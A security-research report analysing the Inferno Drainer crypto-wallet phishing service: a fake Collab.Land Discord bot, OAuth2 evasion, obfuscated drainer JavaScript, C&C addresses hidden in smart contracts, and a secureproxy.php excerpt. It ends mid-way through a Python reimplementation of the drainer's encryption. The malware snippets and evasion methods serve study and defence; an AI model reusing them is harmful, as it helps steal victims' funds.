## **Key Takeaways**

- Check Point Research uncovered a sophisticated phishing campaign that abuses Discord and targets crypto users. Attackers redirects users from a legitimate Web3 website to a fake Collab.Land bot and then to a phishing site, tricking them into signing malicious transactions. The drainer script deployed on that site was directly linked to Inferno Drainer.
- Despite publicly shutting down in late 2023, Inferno Drainer remained fully operational. Smart contracts deployed in 2023 continued to be used into 2025. Recent campaigns show notable technical upgrades and infrastructure improvements.
- Inferno Drainer employs advanced anti-detection tactics — including single-use and short-lived smart contracts, on-chain encrypted configurations, and proxy-based communication — successfully bypassing wallet security mechanisms and anti-phishing blacklists.
- In just the last six months, more than 30,000 wallets were victimized by Inferno Drainer, resulting in at least $9 million in losses. The combination of evolving technical sophistication and convincing social engineering continues to drive the success of these attacks.

## **Introduction**

In recent years, [cryptocurrency scams](https://research.checkpoint.com/2023/the-rising-threat-of-phishing-attacks-with-crypto-drainers/) have evolved into a highly organized business model known as “Drainer-as-a-Service.” Within this model, developers create specialized set of malicious scripts, smart contracts, and infrastructure enabling other cyber criminals to efficiently steal cryptocurrency from users’ wallets. Attackers simply need to set up a phishing website and embed the drainer script. One of the most notorious examples of this approach is Inferno Drainer, known for the scale and sophistication of its attacks.

In November 2023, the creators of Inferno Drainer officially announced the service’s shutdown. However, it soon became clear that this was only a diversionary tactic. Evidence of continued operation emerged as early as the beginning of 2024. In addition, blockchain analysis indicates that critical smart contracts deployed on September 9, 2023, essential for the operation of the scheme, are still in use today.

Despite significant advances in cryptocurrency wallet security, implementation of malicious transaction warnings, enhanced anti-phishing solutions, and regular blacklisting of fraudulent websites, attackers continue to aggressively adapt to these tactics. In particular, Inferno Drainer continuously refines its methods to bypass security defenses.

The Inferno Drainer developers emphasize protecting their centralized infrastructure from detection by security researchers and law enforcement. Command server addresses are now encrypted and stored within the blockchain. In one of the latest Inferno Drainer variants we discovered in March 2025, communication with command servers is completely offloaded to proxy servers installed by service customers, making it nearly impossible to trace the actual Inferno Drainer infrastructure. Single-use smart contracts and frequent rotation of the blockchain addresses used for victim interactions allows Inferno Drainer to effectively bypass anti-phishing protections built into wallet applications.

Customers of Inferno Drainer also employ inventive tactics to avoid detection and blocking of their servers. They frequently rotate domain names, use intermediate servers for conditional redirection, and implement security tokens that hinder automatic detection of malicious websites. New social engineering and phishing methods enable attackers to effectively lure new victims.

According to our estimates, over the past six months alone, more than 30,000 users fell victim to Inferno Drainer scams, resulting in losses exceeding $9 million.

This article provides an in-depth analysis of an active phishing campaign targeting Discord users in crypto and blockchain communities. We thoroughly examine every stage of the attack, from phishing interaction mechanisms to the deep technical intricacies of Inferno Drainer’s operation, including the chain of malicious smart contracts and the subsequent transfer of stolen funds to the attackers’ wallets.

## Inferno Drainer’s Discord Phishing Attack Explained

In January 2025, Check Point Research discovered that members of a prominent crypto community were targeted by a sophisticated phishing attack involving Discord. The attackers combined social engineering techniques with platform-specific features of Discord to carry out the attack. Users attempting to access a Discord support server from a legitimate Web3 project’s website were instead redirected to a phishing site impersonating the popular Collab.Land service and hosting a cryptocurrency drainer. Users received no security warnings indicating that either the website or the smart contracts they interacted with were malicious. Initially, we suspected that the Web3 project’s website had been compromised, but the reality turned out to be far more intriguing. Fortunately, the maintainers of the Web3 service quickly addressed the issue, and it appears that significant losses were avoided in this specific incident. Nevertheless, this event helped us understand the attackers’ methods and allowed us to link this phishing campaign directly to Inferno Drainer.

### The Fake Collab.Land Bot

Collab.Land is a widely used bot in Discord and Telegram communities which facilitates token-gated access management. By verifying users’ cryptocurrency or NFT holdings, Collab.Land grants them access to exclusive channels or groups. Users connect their wallets and sign a message to prove ownership of the required assets, ensuring secure membership management within Web3 communities.

Typically, when joining a Discord server utilizing Collab.Land, users initially cannot access most channels. Instead, they interact with the Collab.Land bot, which provides a link redirecting them to the legitimate website (*connect.collab.land*) to connect their wallet and verify their asset ownership. If verification is successful, users gain access to restricted channels.

In the attack we investigated, the initial interaction follows the same pattern. While browsing the legitimate Web3 service website, users clicked on an invitation link to join the associated Discord server. Once there, they saw numerous locked channels and only one accessible channel named **“verify-here”**, containing a message purportedly from the Collab.Land bot inviting them to verify their crypto assets. The entire scenario was convincingly realistic and capable of deceiving even experienced users:

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-1-Left-fake-bot-right-legitimate-Collab.Land-bot-1024x291.png)

**Figure 1** – Left: fake bot; right: legitimate Collab.Land bot.

There were subtle visual differences between the fake and legitimate bots, but we anticipate attackers will continue refining their imitation. Currently, the most critical distinguishing factor is the absence of a **“Verified App”** checkmark on the fake bot, which is prominently displayed on the genuine Collab.Land bot.

Another critical difference is what happens when a user clicks the **“Let’s go”** button. The legitimate bot provides clear instructions informing users that they need to sign a message with their wallet to verify ownership of their blockchain account. It explicitly emphasizes that this action does not trigger any blockchain transactions and does not require payment of [gas fees.](https://iq.wiki/wiki/gas) In contrast, the fake bot immediately displays a warning message that it will gain access to the user’s Discord username, avatar, and banner. It then redirects the user to the malicious website hosted at **hxxps://roles-collab[.]com** (previously, attackers used another domain—**org.redirect-302[.]com**):

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-2-Differences-when-clicking-the-Lets-go-button-Fake-bot-Legitimate-Collab.Land-bot-1024x552.png)

**Figure 2** – Differences when clicking the “Let’s go” button. Left: Fake bot; right: Legitimate Collab.Land bot.

Next, the potential victim is redirected to a phishing website that closely resembles the legitimate [Collab.Land](http://collab.land/) service interface. It also displays the actual username and avatar, the community icon received from Discord, just like the legitimate Collab.Land does. Besides differences in color schemes and slight discrepancies in the size of wallet icons and labels, the phishing site prominently includes a banner at the top advising users to **“Always verify the address is [the phishing website’s URL].”**

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-3-Left-Phishing-website-Right-Genuine-Collab.Land-website-hosted-at-connect-collab-land-1024x327.png)

**Figure 3** – Left: Phishing website; Right: Genuine Collab.Land website hosted at *connect.collab.land*

As demonstrated, potential victims reach the phishing website with just two clicks. After connecting their wallet, users are then prompted to sign malicious transactions.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-4-%E2%80%93-Malicious-transaction-requesting-approval-to-spend-victims-USDC-tokens-617x1024.png)

**Figure 4** – Malicious transaction requesting approval to spend the victim’s USDC tokens.

After signing the malicious transaction, the wallet owner either directly transfers funds to the attackers or grants unlimited permission to spend tokens from their wallet.

Note that legitimate Collab.Land service genuinely requires wallet signature verification. Consequently, even experienced cryptocurrency users may lower their guard. As they expect the service to request a wallet signature, they may instinctively click “Approve” without careful inspection, falling into the trap.

In the following sections, we delve deeper into the underlying technical infrastructure, obfuscation techniques, and blockchain interactions that make Inferno Drainer attacks particularly resilient and challenging to mitigate.

### Discord Invite Link Hijacking

The first step in compromising victims is to lure them into joining a malicious Discord server. But how do they attract the users? One effective method is hijacking expired vanity invite links, a technique that takes advantage of Discord’s custom invite system.

Many Discord servers use vanity URLs (e.g., *discord.gg/myproject*) to create memorable, branded invite links. These links are available only to Discord servers with [Level 3 Boost](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link). However, if a server owner stops paying and the server loses its boosts, the vanity invite link becomes available for anyone to claim.

Attackers can monitor and wait for high-value vanity links to expire. The moment a link becomes free, they instantly register it on their malicious server. As many users may still have the old invite saved in announcements, websites, or social media posts, they unknowingly join the attacker’s server instead of the legitimate one. Attackers don’t just hijack random vanity links; they specifically target links used by crypto projects, ensuring that the traffic they intercept is highly valuable. By monitoring invite URLs associated with crypto communities, NFT projects, and Web3 platforms, they increase the likelihood of attracting users who own cryptocurrency wallets and digital assets. This makes their malicious campaigns far more effective, as the victims are not just regular Discord users, but individuals who are more likely to hold valuable tokens, NFTs, or other assets worth stealing.

### How Attackers Abuse Discord OAuth2 to Evade Detection

An interesting aspect of this campaign is how the use of Discord bots combined with OAuth2 authentication flow allows the attackers to evade automated detection of their malicious websites.

Let’s take a closer look at the technical workflow initiated when a user interacts with the malicious Discord bot:

1. When the user clicks the “Let’s go” button within the fake Discord bot message, Discord initiates an OAuth2 authentication flow and generates a unique, single-use authorization URL. This URL contains two critical parameters:
   – **code**: A short-lived, single-use OAuth2 authorization code provided by Discord.
   – **state**: Typically, an identifier used by attackers to track sessions or associate specific victims with Discord server IDs.
   The URL follows this general format:
   `hxxps://roles-collab[.]com/oauth/callback?code={auth_code}&state={state}`
2. The attackers’ server (**roles-collab[.]com**) receives this request and immediately exchanges the provided authorization code with Discord’s API for an access token. This step reveals essential details about the victim, including their Discord username and avatar ID, without explicitly prompting the user. Once the authorization code is used, it becomes invalid for subsequent requests.
3. After successfully retrieving user data from Discord, the attackers’ server generates another short-lived redirect URL. This URL includes a JWT (JSON Web Token), encoded victim information, and the Discord server identifier. The user is then redirected to the phishing page hosted on another domain, closely mimicking the legitimate Collab.Land site. Sample response from attackers’ server (302 redirect):

HTTP/2 302 

content-length: 0

location: hxxps://collab.land-wl[.]com/collab?token={JWT}&server={discord_server_id}&user={username}&avatar={avatar_id}%2Fnull

This URL is only valid for approximately five minutes. After that, any attempts to access it result in a 404 error. This limits the time window for analysis and makes detection efforts even more challenging.

Attempting to use an expired or invalid token to access the attackers’ website also results in a 404 error.

Valid tokens can only be obtained through the intermediate server (roles-collab[.]com). To get a token, users must have a valid OAuth2 authorization code, which is exclusively generated by interacting with the malicious Discord bot.

As a result, without an invite link to the specific Discord servers hosting the malicious bot, identifying the attackers’ phishing websites becomes extremely challenging. Unfortunately, there is currently no centralized registry containing all Discord server invite links, which would allow us to scan and identify malicious bots.

Even if a phishing site is discovered through victim reports, this is not a major impediment for the attackers as they proactively rotate their phishing domains every few days. Our investigation identified numerous such domains, including:

- collab.land-wl[.]com
- collab-layer0-land[.]com
- collab-xlm-land[.]com
- collab-dao-land[.]com
- collab-mpc-land[.]com

By combining the tactics of short-lived tokens, intermediate OAuth2 servers, and rapidly rotating phishing domains, the attackers effectively evade detection and sustain their malicious operations over extended periods.

### Classical Phishing Schemes

We have observed that Inferno Drainer customers continue to employ traditional phishing schemes involving [fake token airdrops](https://www.group-ib.com/blog/inferno-drainer/). For example, following the successful launch of the **$TRUMP** token on January 17, 2025, attackers quickly initiated their own phishing campaign promising free distribution of **$TRUMP** tokens through a website `airdop-trump[.]com`. In reality, “airdrop” participants became victims.

The phishing campaign also specifically targeted X (formerly Twitter) users from Japan (`https://x[.]com/AYANONASDAQ/status/1881085122528866558`):

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-5-%E2%80%93-Screenshot-of-a-phishing-tweet-promoting-a-fake-TRUMP-token-airdrop-558x1024.png)

**Figure 5** – Screenshot of a phishing tweet promoting a fake $TRUMP token airdrop.

## Drainer Technical Details

The main functionality of the drainer is implemented in a single JavaScript file ranging in size from 5 to 10 megabytes. For each customer, Inferno Drainer generates a unique script using multiple layers of obfuscation. These scripts typically have random names resembling UUIDs (Universally Unique Identifiers), such as `66bc4b94-a47f-4157-9a3b-9a4205f44360.js`. Even on the same phishing site, the script may be updated every few days, each time receiving a new filename. This strategy significantly complicates detection and blocking efforts by automated security tools.

### Anti-analysis Techniques

The crypto drainer uses advanced obfuscation techniques to conceal strings and function calls, making analysis and reverse engineering more difficult. It also employs anti-debugging mechanisms to hinder dynamic analysis. These are the main methods used:

**1. String Obfuscation with Function-Based Indexing**

Instead of directly referencing common properties or methods, the drainer constructs them dynamically using functions that calculate substrings.

**Example:**

_0x14213f**[**_0x28ed**(**10259, 0x54ec**)** + _0x28ed**(**18055, 0x2a22**)]**

This is equivalent to:

_0x14213f**[**"len" + "gth"**]**

Here, “length” is reconstructed from smaller parts, hiding the string from straightforward detection.

**2. Split and Concatenate Strings with Function Calls**

The drainer avoids hardcoding strings by splitting them into smaller parts and concatenating them at runtime. Instead of using direct concatenation (e.g., +), it uses multifunctional helper functions like XeB8Fcz(), which perform different operations depending on the parameters.

Example:

XeB8Fcz**(**'debu', 'gger', sOrjvb = 17**)**

This is equivalent to:

"debugger"

However, **XeB8Fcz()** is a versatile function that can also perform arithmetic, and logical operations, depending on how it is called.

**3. Obfuscated Function Calls with Dynamic Property Access**

Functions are called indirectly by dynamically generating method names or using computed properties.

Example:

_0x50afbe**[**'cal'+'l'**](**undefined, someArg**)**

This is equivalent to:

_0x50afbe.call**(**undefined, someArg**)**

This obfuscation hides the method name by breaking it into smaller strings.

**4. Encoded Indices and Arithmetic Obfuscation**

Array indices and function arguments are obfuscated with complex arithmetic expressions.

Example:

_0xe3fceb**[**0x30a*-0x5+-0xf*-0x87+-0x175*-0x5**]**

This evaluates to:

_0xe3fceb**[**0**]**

**5. Anti-Debugging Techniques Using Dynamic Function Construction**

Inferno Drainer includes anti-debugging mechanisms designed to hinder dynamic analysis and reverse engineering. These mechanisms rely on heavily obfuscated code, making it extremely difficult to understand the logic or identify specific technique.

**Original Obfuscated Code:**

j_MFQX**(****(**''+_0xe3fceb**[**0x30a*-0x5+-0xf*-0x87+-0x175*-0x5**]**/_0xe3fceb**[**-0x15c0+-0xc1*-0x29+-0x929**]****)****[**_0x50afbe**(**-0x1dc9+-0x2*-0xd8a+0x51*0x50**)****]**!==-0xef*-0x23+-0x1685+0xa27*-0x1||_0xe3fceb**[**-0x2449*0x1+-0xa07+-0x3*-0xf70**]**%**(**-0x19dc*-0x1+0x111b+-0x2ae3**)**===-0x2e5*0x6+0x2*-0x304+0x1766?**function****(****)****{****return** XeB8Fcz**(**XeB8Fcz**(****[****]**,sOrjvb=-**(**0xa3f+0xf02+-0x1920**)****)**,sOrjvb=-**(**-0x5*-0x42d+0x89*-0x2c+0x2cc**)****)**;**}****[**_0x2a4076**(**0x335c,_0x3ad540._0x538711,0xcc2**)**+_0x2a4076**(**-0x66,-0x8ea,-_0x3ad540._0x37eb35**)**+'uct'+'or'**]****(**XeB8Fcz**(**_0x50afbe**(**-0x73a+0xe7d+-0x1*-0xf59**)**,_0x50afbe**(**-0x1c3+0x2033+-0x7d3**)**,sOrjvb=-0x1*-0x117+-0x1cec+0x1be6**)****)****[**_0x50afbe**[**'cal'+'l'**]****(**undefined,-0x7*-0x420+-0x1658+0x1*0x1016**)****]****(**_0x50afbe**(**-0x11*-0x24e+-0x2cd+-0xdc2**)****)**:**function****(****)****{****return** XeB8Fcz**(****[****]**,sOrjvb=-**(**-0x2371+0x20e6+-0xab*-0x4**)****)**;**}****[**_0x38dcbe**(**0x3843,_0x3ad540._0x6840aa,0x15e6**)**+'str'+**(**'uct'+'or'**)****]****(**XeB8Fcz**(**_0x50afbe**(**-0x297a+-0x1*-0x6b+0x3*0x1539**)**,_0x50afbe**(**-0x34*-0x8d+-0x7*0x5b7+-0x1*-0x21fa**)**,XIfqRhC**(**0x19f7+-0x161b+0x3cb*-0x1**)****)****)****[**_0x50afbe**(**-0x3*-0xdfa+0x2802+-0x3b50**)****]****(**'sta'+'teO'+_0x2a4076**(**_0x3ad540._0x45ab88,0xbee,_0x3ad540._0x217f7b**)**+'ct'**)**,EM8p5y**(**_0x1615be,-0x612+0xc*-0x88+0xc73**)**;

Once it’s partially deobfuscated, the code reveals a well-known anti-debugging technique that we described in [our previous report](https://research.checkpoint.com/2024/wallet-scam-a-case-study-in-crypto-drainer-tactics/). The technique leverages JavaScript’s dynamic function construction to inject a literal debugger statement into newly created functions. As these functions are invoked (in a recursive or continuously triggered manner), they cause the debugger to pause execution whenever developer tools are opened, effectively freezing the web application.

__**(****(**'' + _0xe3fceb**[**0**]** / _0xe3fceb**[**0**]****)****[**'length'**]** !== 1 || _0xe3fceb**[**0**]** % 20 === 0 ? **function** **(****)** **{**

  **return** XeB8Fcz**(**XeB8Fcz**(****[****]**, sOrjvb = -33**)**, sOrjvb = -33**)**;

**}****[**'constructor'**]****(**XeB8Fcz**(**'debu', 'gger', sOrjvb = 17**)****)****[**'call'**]****(**'action'**)** : **function** **(****)** **{**

  **return** XeB8Fcz**(****[****]**, sOrjvb = -33**)**;

**}**.**constructor****(**XeB8Fcz**(**'debu', 'gger', XIfqRhC**(**17**)****)****)****[**'apply'**]****(**"stateObject"**)**, EM8p5y**(**_0x1615be, 1**)****)**;

Such logic is deeply buried within layers of obfuscation, making even the detection of the anti-debugging logic itself a non-trivial task.

**6. Multi-Layered Obfuscation**

The drainer combines these techniques recursively, requiring multiple rounds of deobfuscation to understand the logic. For example, a function name might be constructed using one layer of string obfuscation, while its arguments are calculated using encoded indices and arithmetic operations.

### Using Binance Smart Chain to Store Part of the Drainer’s Configuration

One critical aspect of a crypto drainer is that it must eventually direct funds to the attackers’ addresses. In some cases, these malicious addresses are hardcoded directly into the code. Even if the script is heavily obfuscated, hardcoded addresses can be relatively easy to extract and flag as malicious, allowing security vendors to warn potential victims and block transactions. Alternatively, some drainers (such as MS Drainer) query these addresses from a command server—often only when a victim’s wallet contains a sufficient balance. Although the configuration might be encrypted, the command server address itself can still be extracted from the drainer’s code.

In the case of the new version of Inferno Drainer we discovered, the Command & Control (C&C) server address is not hardcoded anywhere. Instead, both a portion of the configuration and the command server address are stored on the Binance Smart Chain within specialized smart contracts. The drainer retrieves these details via legitimate-looking JSON-RPC calls to one of the blockchain’s endpoints. Even if an analyst inspects the data returned by the smart contract, the task is complicated by two factors: first, the data is [ABI-encoded](https://docs.soliditylang.org/en/latest/abi-spec.html) (Application Binary Interface is a standardized way to encode function calls and data for smart contracts); and second, it is protected with AES encryption. In addition, multi-layer encryption is employed with several keys, making it extremely challenging to reverse-engineer the configuration directly.

**Two Smart Contracts with Separate Roles**

**Smart Contract 1 (referred to as “RemotePatchConfig Contract”): 0x158862Ec60B7934f1333e53AC1e148811A2E3BeB**

- Stores various configuration parameters in plain text. These include, but are not limited to:
  - **Feature Toggles**: Enable or disable specific functionalities within the drainer.
  - **Protocol Configuration**: Specify which protocol to use for communication with the command server, such as WebSocket, WebRTC, or HTTP.
- The parameters are stored as key-value pairs and are fetched dynamically by the drainer at runtime.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-6-%E2%80%93-Debfuscated-malicious-JavaScript-BSC-smartcontract-query-to-obtain-configuration.png)

**Figure 6** – Deobfuscated malicious JavaScript: BSC smart contract query to obtain configuration.

**Smart Contract 2: 0xd24aeC3254652B0ab565E41A945b491e98Bb5FFC**

- Stores the **encrypted command server address**, which is needed to complete the connection to the attackers’ infrastructure.
- This address is protected using **multi-layer AES encryption** with several keys, making it impossible to extract without deobfuscating the script.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-7-%E2%80%93-Debfuscated-malicious-JavaScript-BSC-smartcontract-query-to-obtain-and-decrypt-CC-URL.png)

**Figure 7** – Deobfuscated malicious JavaScript: BSC smart contract query to obtain and decrypt C&C URL.

After decrypting the response from the contract, we can get the address of the server. The latest value for the address:

```
hxxps://sharp-dev-40d.ivx9ctza.workers[.]dev
```

**Variant Using Multicall3**

Another active variant of **Inferno Drainer** uses a different method for retrieving the C&C server address.

In this version, the Inferno Drainer script interacts with the legitimate smart contract **Multicall3**, located at the address **0xca11bde05977b3631167028862be2a173976ca11** on the BSC blockchain. It invokes the function aggregate3, passing parameters that target the Inferno Drainer configuration storage smart contract at:

- **0x72cD63650700E5395f4aB238cecD18497A33a83e**

Example Request:

**{**

  **"calls":** **[**

​    **{**

​      **"target":** "0x72cD63650700E5395f4aB238cecD18497A33a83e"**,**

​      **"allowFailure":** **true****,**

​      **"callData":** "0x6ee24abb"

​    **}****,**

​    **{**

​      **"target":** "0x72cD63650700E5395f4aB238cecD18497A33a83e"**,**

​      **"allowFailure":** **true****,**

​      **"callData":** "0x89dfec91"

​    **}****,**

​    **{**

​      **"target":** "0x72cD63650700E5395f4aB238cecD18497A33a83e"**,**

​      **"allowFailure":** **true****,**

​      **"callData":** "0xd3e0f3ba"

​    **}****,**

​    ...

  **]**

**}**

In turn, the address of this storage smart contract is retrieved from the RemotePatchConfig contract (address: **0x158862Ec60B7934f1333e53AC1e148811A2E3BeB**), which we described earlier.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-8-%E2%80%93-RemotePatchConfig-contract-storing-the-address-of-the-storage-smart-contract.png)

**Figure 8** – RemotePatchConfig contract storing the address of the storage smart contract.

The smart contract at **0x72cD63650700E5395f4aB238cecD18497A33a83e** contains only a fallback method with the following behavior:

- If msg.sender is the owner, the stored data is updated.
- If the call is made by anyone other than the owner, the contract returns the previously stored value.

Therefore, callData does not affect the outcome and can take any value.

This use of Multicall3.aggregate3 with multiple random selectors likely serves to complicate analysis and evade detection, as Multicall3 is a legitimate contract. The use of ABI-encoding helps the drainer to obfuscate communication, as the JSON shown above is encoded as follows:

**{**

  **"method":** "eth_call"**,**

  **"params":** **[**

​    **{**

​      **"to":** "0xca11bde05977b3631167028862be2a173976ca11"**,**

​      **"data":** "0x82ad56cb0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000280000000000000000000000000000000000000000000000000000000000000032000000000000000000000000072cd63650700e5395f4ab238cecd18497a33a83e..."

​    **}****,**

​    "latest"

  **]****,**

  **"id":** 44**,**

  **"jsonrpc":** "2.0"

**}**

**Response and Decoding**

The smart contract returns a previously stored value containing a **base64**-encoded string:

```
dQBnAGcAYwBmADoALwAvAGQAaAB2AHAAeAAtAGEAcgBnAC0ANgBvAHEALgBwAG0ANQAzAHkAMQBiAGUALgBqAGIAZQB4AHIAZQBmAC4AcQByAGk=
```

After decoding from **base64**, the result resembles a URL but remains unreadable, as it is encoded using the **ROT13** algorithm:

```
uggcf://dhvpx-arg-6oq.pm53y1be.jbexref.qri
```

Decoding this using ROT13 yields the C&C server address:

```
https://quick-net-6bd.cz53l1or.workers[.]dev
```

**Historical Data**

The data within this smart contract was updated multiple times between January 26-27, 2025, with over 100 changes recorded. Analysis of these update transactions revealed other addresses. The complete list of these addresses is very long. Therefore, we show only a selected few as examples:

- hxxps://cloud-tech-8c4.pn8hzydg.workers[.]dev
- hxxps://cloud-pool-ae5.guc7wbsy.workers[.]dev
- hxxps://quick-net-ba8.khslx07s.workers[.]dev
- hxxps://green-hub-a93.vt3y2et5.workers[.]dev
- hxxps://swift-box-3c8.xm7kk31l.workers[.]dev
- hxxps://smart-code-952.6bx6q6ey.workers[.]dev
- hxxps://smart-dev-e5f.zqvxx68r.workers[.]dev
- hxxps://cloud-tech-a74.3s7r79db.workers[.]dev
- hxxps://sharp-tech-bcd.pxc4kghr.workers[.]dev
- hxxps://swift-lab-2f6.3wccvy5o.workers[.]dev

We also identified four more smart contracts that were used previously to store C&C addresses:

- **0x00F8Ea4c5793d94b2AF416f76817F3AFb44B0F4f**
- **0x022b8D5ec68dD20e18db8Af0E7bcfF5081CE69DC**
- **0x9b435747bcaB40A0Dd365804955541facE3c2f3F**
- **0xa02a8803A51F9012f6AbbcA1a4B6e66cc5419B23**

Unlike the current contract, these older contracts stored data in plain text without using ROT13 encoding, and even without base64-encoding.

This evolution in data storage methods suggests an adaptation to enhance obfuscation and avoid detection, showcasing the continual development in the tactics used by Inferno Drainer.

### **Using Cloudflare Workers as Inferno Drainer backend servers**

We observed that all C&C URLs used in the current Inferno Drainer campaigns, as well as those stored in smart contracts late last year, point to **workers.dev** domain. This domain is related to Cloudflare Workers, a serverless platform that allows users to deploy JavaScript, Python, Rust, or WebAssembly applications. Security tools and firewalls rarely blacklist Cloudflare’s infrastructure, making it more resistant to takedowns. At the same time, we cannot say definitively whether Cloudflare Workers are used to host Inferno Drainer’s infrastructure or if they merely function as a proxy, and the core infrastructure is hosted elsewhere.

### **Hiding the Original Drainer Infrastructure Behind a Proxy Deployed by the Customer**

Starting in March 2025, we began observing drainer variants that no longer connect directly to their infrastructure but instead use a so-called “secure proxy.” This secure proxy is a PHP script installed on the customer’s server, which dynamically retrieves the current C&C server address from a smart contract and transparently forwards requests and responses between the victim and the C&C server. Unlike JavaScript executed in the victim’s browser, this proxy does not expose the real C&C server address.

Due to a misconfiguration on one of the Inferno Drainer customer’s hosts, we were able to access the source code of the secureproxy.php script.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-9-%E2%80%93-secureproxy.php-obfuscated-code.png)

**Figure 9** – secureproxy.php obfuscated code.

The script applies a light form of obfuscation where all string values are replaced with base64-encoded equivalents, making the code unreadable at first glance. However, since proper access control prevents retrieving the source code, this obfuscation appears to be more of an afterthought rather than a serious security measure.

After deobfuscating the script, we identified a key component: a BSC blockchain smart contract responsible for dynamically resolving the C&C server’s address:

- **0xe9d5f645f79fa60fca82b4e1d35832e43370feb0**

Below is an excerpt from the deobfuscated version of the script:

**<**?php

// ...

**if** **(**$_GET["e"**]** === "ping_proxy"**)** **{**

​    header**(**"Content-Type: text/plain"**)**;

​    **echo** "pong";

​    **exit**;

**}** **else** **if** **(****isset****(**$_GET["e"**]))** **{**

​    $proxy = new SecureProxyMiddleware**([**

​        "rpcUrls" =**>** **[**

​            "<https://rpc.ankr.com/bsc>",

​            "<https://bsc-dataseed2.bnbchain.org>"

​        **]**,

​        "contractAddress" =**>** "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"

​    **])**;

​    $endpoint = urldecode**(**$_GET["e"**])**;

​    $endpoint = ltrim**(**$endpoint, "/"**)**;

​    $proxy->handle**(**$endpoint**)**;

**}** **else** **{**

​    http_response_code**(**400**)**;

​    **echo** "Missing endpoint";

**}**

?**>**

We extracted the latest C&C address from this smart contract, as well as previous addresses that were set earlier:

- hxxps://dfuykhndfkhjdfnkdfhbdfkjhdbhkf[.]com
- hxxps://jdfkgkgkfkjjkfkffdkfdkdfkdkdk[.]com
- hxxps://kjnfdkjndsliurriuvlndvlijsndlij[.]com
- hxxps://rhfhfhffgkllvfdklfvl[.]com

Therefore, we can see the evolution of how Inferno Drainer developers attempt to shield their centralized infrastructure from detection and takedown. Their tactics range from storing server addresses in smart contracts, applying obfuscation, and layered encryption, to offloading proxy functionality to customers — all while continuing to leverage blockchain for address storage.

At the same time, we also found that the drainer can still contain obfuscated server addresses directly within the JavaScript code executed on the victim’s side, likely as a fallback mechanism:

"rotatingURL_koy": **[**

​    "mwpt9h-gc0d1q-shutter-88a0609b.koyeb[.]app",

​    "njc21n-vi8z47-jaatcom822-eb36cf51.koyeb[.]app"

**]**

### C&C communication and configuration

**Requests and encryption**

Inferno Drainer transmits data to its C&C servers using JSON messages that undergo multiple layers of AES encryption. Each encryption layer uses different keys, making it harder to analyze the intercepted traffic.

The encryption process relies on a combination of key sources:

- Randomly generated values – Transmitted within the next encryption layer.
- Date-based strings – Can be computed on both the client and server, eliminating the need for transmission.
- Hardcoded keys – The string `"inferno"` is used as the final encryption layer.

Each encrypted layer is wrapped inside a new JSON structure, which includes additional metadata, such as script version, customer identifier (unique to the attacker’s affiliate), short hashes of different values for integrity verification and, probably to prevent data spoofing.

The JSON payload contains various details about the victim’s interaction including timestamps, website, browser, and wallet data.

A typical request containing victim details and event logs:

**{**

​    **"walletAddress":** "{victim_wallet_address}"**,**

​    **"walletName":** "MetaMask Wallet WalletConnect"**,**

​    **"site":** "{landing_website_url}"**,**

​    **"fingerprintData":** **{**

​        **"visitorId":** "{unique_victim_id}"**,**

​        **"fingerprint":** **null****,**

​        **"requestId":** **null****,**

​        **"isTelegramMiniApp":** **false**

​    **}****,**

​    **"logs":** **[**

​        **{**

​            **"type":** "connect_but_seed_prompt"**,**

​            **"data":** **{**

​                **"walletName":** "MetaMask Wallet WalletConnect"**,**

​                **"walletAddress":** "{victim_wallet_address}"**,**

​                **"totalWalletPrice":** **{**wallet_value_in_usd**}**

​            **}****,**

​            **"createdAt":** **{**timestamp**}**

​        **}**

​    **]**

**}**

Below is a list of some of the log message types that are sent to the server:

| **Log message type**    | **Description**                                              |
| ----------------------- | ------------------------------------------------------------ |
| site_loaded             | Website loaded on the victim’s browser                       |
| modal_open              | User clicked a button, triggering a wallet connection pop-up |
| request_connect         | User was prompted to connect a wallet                        |
| connect                 | Successful wallet connection                                 |
| connect_too_low         | Wallet connected, but nothing to drain                       |
| connect_but_seed_prompt | Wallet connected, prompted for a seed phrase                 |
| switch_chain_prompt     | Prompted to switch blockchain networks                       |
| verify_sign_prompt      | Prompted to sign a transaction                               |

The created JSON payload is encrypted in four layers:

- **Layer 1**: Uses a key derived from the hardcoded string “inferno” and random values (timestamp-based).
- **Layer 2**: Uses a key derived from the same random values. Wraps the first encrypted payload in a new JSON structure that includes the encrypted attacker customer ID.
- **Layer 3**: Uses a date-based key. The data is additionally encoded and wrapped into a new JSON structure that includes the drainer version.
- **Layer 4**: Uses the hardcoded key `"inferno"`.

The original JavaScript implementation of Inferno Drainer’s encryption algorithm is heavily obfuscated. To clarify its functionality, we provide a Python reimplementation of the core encryption logic.

**def** get_short_hash**(**s**)**:

​    *"""Computes a 32-bit hash similar to JavaScript's hashCode function."""*

​    hash_val = 0

​    **for** ch **in** s:

​        hash_val = **((**hash_val &lt;&lt; 5**)** - hash_val**)** + ord**(**ch**)**

​        hash_val &amp;= 0xFFFFFFFF

​    **if** hash_val &amp; 0x80000000:

​        hash_val = -**((**~hash_val + 1**)** &amp; 0xFFFFFFFF**)**

​    **return** hash_val

​    

**def** inferno_encode**(**s**)**:

​    *"""Encodes data using a XOR-based transformation."""*

​    **return** bytes**(**ord**(**b**)** ^ 3 **for** b **in** s**)**.hex**()**

​    

**def** encrypt_body**(**payload_data**)**:

​    timestamp_7 = int**(**str**(**int**(**time.time**()** * 1000**))[**:7**])**

​    random1 = round**(**21474736479 * random.random**()** + 100000**)**

​    random2 = int**(**8999 * random.random**()** + 1000**)**

​    rand_str_original = getRandomString**(**25**)**

​    rand_str_base64 = btoa**(**rand_str_original**)**

​    rand_str_hashed = get_short_hash**(**rand_str_original**)**

